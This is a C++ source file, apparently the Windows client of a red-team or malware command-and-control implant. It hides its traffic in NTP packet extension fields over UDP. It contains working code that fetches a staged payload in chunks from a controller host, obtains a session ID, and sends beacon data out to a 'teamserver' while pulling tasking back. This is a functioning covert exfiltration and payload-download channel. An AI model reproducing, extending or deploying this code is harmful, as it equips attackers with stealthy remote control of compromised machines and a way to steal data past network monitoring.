#define NOMINMAX
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <vector>
#include <iostream>
//std::vector<uint8_t> placeholderNtpPacket = {
//    0x23, 0x00, 0x06, 0xEC, 0x00, 0x00, 0x00, 0x00,
//    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
//    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
//    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
//    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
//    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
//    0x4D, 0x5A, 0x00, 0x08, 0xDE, 0xAD, 0xBE, 0xEF
//};

#include <winsock2.h>
#include <ws2tcpip.h>
#include <vector>
#include <string>
#include <stdexcept>
#include <iostream>
#include "constants.hpp"
#include "helpers.hpp"
#include "createntp.hpp"
#include "parsentp.hpp"
#include <algorithm>

#pragma comment(lib, "Ws2_32.lib")

//right nwo doesn't work due to a socket_error throwing an exception, as of course it does cuz the server can't respond. Problem for later/a feature later
//void waitForControllerToComeOnline() {
//	std::vector<uint8_t> packetData = {};
//
//	while (true) {
//		try {
//			NTPPacket normalNtpPacketClass;
//			std::vector<uint8_t> normalNtpPacket = normalNtpPacketClass.getPacket();
//
//			if (normalNtpPacket.size() == 48) {
//				//std::cout << "[+] Controller Online at " << Controller::serverAddress
//					<< ":" << Controller::port << std::endl;
//				return;
//			}
//			else {
//				//std::cout << "[+] Controller Offline at " << Controller::serverAddress
//					<< ":" << Controller::port << std::endl;
//			}
//
//			// Optional: you could also probe the server by sending a small UDP packet here
//			// sendChunk(normalNtpPacket);
//
//		}
//		catch (const std::exception& ex) {
//			//std::cerr << "[!] Socket or packet exception: " << ex.what()
//				<< " — retrying in 5s..." << std::endl;
//		}
//		catch (...) {
//			//std::cerr << "[!] Unknown exception while checking controller — retrying in 5s..."
//				<< std::endl;
//		}
//
//		Sleep(5000); // wait before retrying
//	}
//}


std::vector<uint8_t> sendChunk(
    std::vector <uint8_t> packet
) {
    //Pull addresses from constant
    std::string serverAddress = Controller::serverAddress;
    uint16_t port = Controller::port;

    //std::cout << "Sending packet to " << serverAddress << ":" << port << " of size " << packet.size() << std::endl;

    ////std::cout << "[NET] Size of chunk: " << packet.size() << std::endl;

    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    std::vector<uint8_t> response;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        throw std::runtime_error("WSAStartup failed");
    }

    try {
        // Create socket
        sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock == INVALID_SOCKET) {
            throw std::runtime_error("Failed to create socket");
        }

        // Set timeout (e.g., 5 seconds)
        DWORD timeout = static_cast<DWORD>(Beacon::responseTimeout); //one minute //wait //Beacon::responseTimeout
        //setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
		setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

        // Setup destination address
        sockaddr_in destAddr = {};
        destAddr.sin_family = AF_INET;
        destAddr.sin_port = htons(port);
        if (inet_pton(AF_INET, serverAddress.c_str(), &destAddr.sin_addr) != 1) {
            throw std::runtime_error("Invalid IP address");
        }

        // Send packet
        int sent = sendto(sock, reinterpret_cast<const char*>(packet.data()), static_cast<int>(packet.size()), 0,
            reinterpret_cast<sockaddr*>(&destAddr), sizeof(destAddr));
        if (sent == SOCKET_ERROR) {
            throw std::runtime_error("Failed to send packet");
        }

        // Receive response
        //char buffer[1024 * 10 * 10];  // 2048 bytes just in case anything gets too big. Probaby should make more dynamic
		char buffer[65535]; //using MAX size an NTP is allowed to be, just incase some massive NTP packet is sent. 
        sockaddr_in fromAddr = {};
        int fromLen = sizeof(fromAddr);

        int recvLen = recvfrom(sock, reinterpret_cast<char*>(buffer), sizeof(buffer), 0,
            reinterpret_cast<sockaddr*>(&fromAddr), &fromLen);
        if (recvLen == SOCKET_ERROR) {
            throw std::runtime_error("Timeout or error receiving response");
        }

        //print_packet_hex(buffer, recvLen);

        response.assign(buffer, buffer + recvLen);



    }
    catch (...) {
        if (sock != INVALID_SOCKET) {
            closesocket(sock);
        }
        WSACleanup();
        throw;
    }

	//sleep. Sleeping here as everythign that clals this will be forced tos leep
	Sleep(Client::packetSleepTimeMs);

    closesocket(sock);
    WSACleanup();
    return response;
}

// ======================================
// getFuncs
// ======================================
std::vector<uint8_t> getPayload(std::vector<uint8_t> clientId) {
    //Create pcaket
    auto packet = NTPPacket();
    //packet.printPacket();
    std::vector<uint8_t> packetData = { 0x64 }; //packetData on giveMePayload asks for arch?
    std::vector<uint8_t> zeroPacketData = { 0x00 }; //packetData on giveMePayload asks for arch?

    // =============================================================
    //1. Send a NtpExtensionField::giveMePayload packet. This returns size of inbound payload
    // =============================================================

    NTPPacket giveMePayloadPacketClass;
    giveMePayloadPacketClass.addExtensionField(
        NtpExtensionField::giveMePayload,
        packetData,
        clientId //placeholder until real id

    );
    std::vector<uint8_t> giveMePayloadPacket = giveMePayloadPacketClass.getPacket();
    std::vector<uint8_t> responsePacket = sendChunk(giveMePayloadPacket);

    //get size from packet
    NTPPacketParser sizePacketParsererClass(responsePacket);
    auto payloadSizeVector = sizePacketParsererClass.getExtensionData();
    uint32_t payloadSize = vectorToUint32(payloadSizeVector);

    // =============================================================
    //2. Iterate over size, and send a 0x00 (NtpExtensionField::giveMePayload) packet, until all data has been recieved.
    // =============================================================

    //create our packet first so we don't have to keep re-creating it
    NTPPacket getMoreOfPayloadPacketClass;
    getMoreOfPayloadPacketClass.addExtensionField(
        NtpExtensionField::giveMePayload,
        zeroPacketData,
        clientId //placeholder until real id
    );

    std::vector<uint8_t> getMoreOfPayloadPacket = getMoreOfPayloadPacketClass.getPacket();
    std::vector<uint8_t> payloadBuffer;
    //std::cout << "Retrieveing payload of size " << payloadSize << std::endl;
    uint32_t counter = 0;

    while (payloadBuffer.size() < payloadSize) {
        //send chunk and get data out of it
        std::vector<uint8_t> responsePacket = sendChunk(getMoreOfPayloadPacket);

        //parse
        NTPPacketParser parsedPacketClass(responsePacket);
        std::vector<uint8_t> extensionData = parsedPacketClass.getExtensionData();

        //add data to vector
        payloadBuffer.insert(payloadBuffer.end(), extensionData.begin(), extensionData.end());

        //std::cout << "Packet [" << counter << "/" << payloadSize / Client::maxChunkSize << "]" << std::endl;
        counter++;
    }

    //3. This should now be the payload data. 
    //std::cout << "[+] Payload of size " << payloadBuffer.size() << " retrieved" << std::endl;
    return payloadBuffer;
}

std::vector<uint8_t> getId() {
    //std::cout << "[?] Getting Session ID" << std::endl;
    std::vector<uint8_t> packetData = {}; //empty cuz it doesn't need anything

    NTPPacket giveMePayloadPacketClass;
    giveMePayloadPacketClass.addExtensionField(
        NtpExtensionField::getIdPacket,
        packetData,
        Client::emptyClientId
    );
    std::vector<uint8_t> giveMePayloadPacket = giveMePayloadPacketClass.getPacket();
    std::vector<uint8_t> responsePacket = sendChunk(giveMePayloadPacket);

    NTPPacketParser responsePacketParser = NTPPacketParser(responsePacket);
    //Get extension data:
    std::vector<uint8_t> extensionData = responsePacketParser.getExtensionData();


    return extensionData;
}

// ======================================
// Chunker - may need some rework
// ======================================
std::vector<uint8_t> size_tToBytes(size_t value) {
	std::vector<uint8_t> bytes(sizeof(size_t));
	std::memcpy(bytes.data(), &value, sizeof(size_t));
	return bytes;
}

/*
Chunker function to send data TO the Server, which will store it, and forward it on to the teamserver.

There's also a function to GET data from the teamserver, which will GET the stored data from the TS and bring it back, it works very similarly, but
sends a blank get data packet up, then the data comes back through the response.

Not the most efficent way to do this, but one of the simplist/clearest.

*/
std::vector<uint8_t> sendBeaconDataToTeamserver(std::vector<uint8_t> data, std::array < uint8_t, 2> extensionField, std::vector<uint8_t> clientId) {
	//std::cout << "======================" << std::endl;
	//std::cout << "Started sendBeaconDataToTeamserver" << std::endl;
	//std::cout << "======================" << std::endl;
	//packetDebugger(data);
	//1. Calculate size of data, (data.size()), then send a sizePacket to server. If OK, continue
	uint32_t dataSize = data.size(); //uint64_t acn hold a size of like 18 Quadrillion bytes (18 exabytes). I hope someone isn't sending that much data but who knows. Rather be safe than sorry.
	std::vector<uint8_t> responseDataBuffer = {};
	int amountOfChunks = (dataSize + Client::maxChunkSize - 1) / Client::maxChunkSize; //gives you one extra chunk for remainder

	//std::cout << "[?] Total Data Size: " << dataSize << std::endl;
	//std::cout << "[?] Max Chunk Size: " << Client::maxChunkSize << std::endl;
	//std::cout << "[?] Number of Chunks needed: " << amountOfChunks << std::endl;

	/*
	Need to send a size message to tell the server that the total message length will be X size, for chunking purposes.
	*/
	auto packetToNotifyServerOfSize = NTPPacket();
	auto incomingSize = uint32ToBytes(dataSize);
	//std::vector<uint8_t> emptyClientId = { 0xFF, 0xFF, 0xFF, 0xFF };

	packetToNotifyServerOfSize.addExtensionField(
		NtpExtensionField::sizePacket, //NtpExtensionField::giveMePayload,
		incomingSize,
		clientId
	);
	//std::cout << "[?] Sending size packet " << std::endl;
	std::vector < uint8_t> packetToNotifyServerOfSizeBytes = packetToNotifyServerOfSize.getPacket();
	printHexVectorPacket(packetToNotifyServerOfSizeBytes);
	std::vector<uint8_t> response = sendChunk(packetToNotifyServerOfSizeBytes);

	//server should now know that the size is size of data to be sent
	//now we start sending the actual data, with the dataForTeamserver
	// Loop over each chunk index
	for (int i = 0; i < amountOfChunks; ++i) { //++i as we want to get the last chunk
		size_t start = i * Client::maxChunkSize; //get how far into the data we need to be to get the chunk
		size_t end = std::min(start + Client::maxChunkSize, static_cast<size_t>(dataSize));

		std::vector<uint8_t> chunkData(data.begin() + start, data.begin() + end);

		////std::cout << "[" << i << "/" << amountOfChunks << "]" << " ChunkData: ";
		//printHexVector(chunkData);

		//Print that we're sending a packet, adn what type of packet it is.
		//std::cout << "----------------------" << std::endl;
		//std::cout << "Sending NTP Packet [" << i + 1 << "/" << amountOfChunks << "]" << std::endl;
		//std::cout << "----------------------" << std::endl;

		//creat ntp packet first
		auto packet = NTPPacket();
		packet.addExtensionField(
			extensionField, //NtpExtensionField::giveMePayload,
			chunkData,
			clientId //REPLACE ME WITH REAL SESSION ID
		);

		//pass full ntp packet 
		std::vector < uint8_t> packet_bytes = packet.getPacket();
		//run the debugger directly on the incoming respnose packet
		packetDebugger(packet_bytes);
		std::vector<uint8_t> response = sendChunk(packet_bytes);

		//Print that we've received  a packet, and then print debug items below it
		//std::cout << "----------------------" << std::endl;
		//std::cout << "Recieved Response Packet" << std::endl;
		//std::cout << "----------------------" << std::endl;
		////run the debugger directly on the incoming respnose packet
		//packetDebugger(response);

		////Parse NTP packet, get data out of it (or whatever else is needed)
		NTPPacketParser responsePacketParser = NTPPacketParser(response);
		//Make sure server says OK when it gets data
		if (responsePacketParser.getExtensionField() == NtpExtensionField::sizePacketAcknowledge) {
			//std::cout << "[?] Got successful ACK from server." << std::endl;
		}
		else {
			//std::cout << "[!] Did not get successful ACK from server." << std::endl;
		}
		//Done! 

	}
	//print full response data
	//std::cout << "[?] Full Data from Responses: ";
	printHexVector(responseDataBuffer);

	//std::cout << "======================" << std::endl;
	//std::cout << "Finished Chunking		" << std::endl;
	//std::cout << "======================" << std::endl;

	//when done looping, return array
	//std::vector<uint8_t> placehodlerVec = {};
	return responseDataBuffer;
}

//Get data from beacon
std::vector<uint8_t> getBeaconDataFromTeamserver(std::vector<uint8_t> clientId) {
	//std::cout << "======================" << std::endl;
	//std::cout << "Started getBeaconDataFromTeamserver" << std::endl;
	//std::cout << "======================" << std::endl;


	/*
	Need to send inital getBeaconData size packet so we know how much data is coming back, and teh resposne to that will hold how much
	*/
	auto packetToGetSizeOfTeamserverData = NTPPacket();
	std::vector<uint8_t> emptyVec = {};
	packetToGetSizeOfTeamserverData.addExtensionField(
		NtpExtensionField::getDataFromTeamserverSize, //NtpExtensionField::giveMePayload,
		emptyVec,
		clientId
	);
	//std::cout << "[?] Sending getDataFromTeamserverSize packet " << std::endl;
	std::vector < uint8_t> packetToGetSizeOfTeamserverDataBytes = packetToGetSizeOfTeamserverData.getPacket();
	std::vector<uint8_t> response = sendChunk(packetToGetSizeOfTeamserverDataBytes);

	//packetDebugger(data);
	//1. Calculate size of data, (data.size()), then send a sizePacket to server. If OK, continue
	NTPPacketParser responseSizeClass(response);
	std::vector<uint8_t> responseSize = responseSizeClass.getExtensionData();
	uint32_t dataSize = vectorToUint32(responseSize);
	std::vector<uint8_t> responseDataBuffer = {};
	int amountOfChunks = (dataSize + Client::maxChunkSize - 1) / Client::maxChunkSize; //gives you one extra chunk for remainder

	//std::cout << "[?] Total Data Size: " << dataSize << std::endl;
	//std::cout << "[?] Max Chunk Size: " << Client::maxChunkSize << std::endl;
	//std::cout << "[?] Number of Chunks needed: " << amountOfChunks << std::endl;


	//server should now know that the size is size of data to be sent
	//now we start sending the actual data, with the dataForTeamserver
	// Loop over each chunk index
	for (int i = 0; i < amountOfChunks; ++i) { //++i as we want to get the last chunk
		size_t start = i * Client::maxChunkSize; //get how far into the data we need to be to get the chunk
		size_t end = std::min(start + Client::maxChunkSize, static_cast<size_t>(dataSize)); //gets the smaller of the 2, whether that be dataSize, or start+maxChunkSize. TLDR, prevents trying to read outside of func arg provided data buffer (which is only so big)

		//Print that we're sending a packet, adn what type of packet it is.
		//std::cout << "----------------------" << std::endl;
		//std::cout << "Sending NTP Packet [" << i + 1 << "/" << amountOfChunks << "]" << std::endl;
		//std::cout << "----------------------" << std::endl;

		//creat ntp packet first
		auto packet = NTPPacket();
		packet.addExtensionField(
			NtpExtensionField::getDataFromTeamserver, //Ask server for teamserver data
			emptyVec,
			clientId
		);

		//pass full ntp packet 
		std::vector < uint8_t> packet_bytes = packet.getPacket();
		//run the debugger directly on the incoming respnose packet
		packetDebugger(packet_bytes);
		std::vector<uint8_t> response = sendChunk(packet_bytes);

		//Print that we've received  a packet, and then print debug items below it
		//std::cout << "----------------------" << std::endl;
		//std::cout << "Recieved Response Packet" << std::endl;
		//std::cout << "----------------------" << std::endl;
		//run the debugger directly on the incoming respnose packet
		packetDebugger(response);

		//Parse NTP packet, get data out of it (or whatever else is needed)
		NTPPacketParser responsePacketParser = NTPPacketParser(response);
		//Get extension data:
		std::vector<uint8_t> extensionData = responsePacketParser.getExtensionData();

		//take extracted extension data, put into buffer
		responseDataBuffer.insert(responseDataBuffer.end(), extensionData.begin(), extensionData.end()); // append response to responseBuffer

	}
	//print full response data
	//std::cout << "[?] Full Data from Responses: ";
	printHexVector(responseDataBuffer);

	//std::cout << "======================" << std::endl;
	//std::cout << "Finished Chunking		" << std::endl;
	//std::cout << "======================" << std::endl;

	//when done looping, return array
	//std::vector<uint8_t> placehodlerVec = {};
	return responseDataBuffer;
}

